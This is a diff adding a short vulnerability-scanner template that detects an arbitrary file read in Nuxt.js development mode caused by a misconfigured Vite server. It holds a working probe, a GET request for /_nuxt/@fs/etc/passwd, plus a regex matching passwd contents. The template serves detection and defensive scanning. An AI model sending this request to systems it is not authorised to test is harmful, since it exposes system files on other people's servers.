@@ -1,0 +1,26 @@
+id: "nuxt-js-lfi"
+name: "Arbitrary File Read in Dev Mode - Nuxt.js"
+severity: "high"
+description: "Vite is misconfigured within nuxt to permit any file to be retrieved from the file system."
+tech:
+  - "nuxt"
+tags:
+  - "huntr"
+  - "lfi"
+  - "nuxtjs"
+  - "vuln"
+reference: "https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/_nuxt/@fs/etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "or"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+      - "\\[(font|extension|file)s\\]"
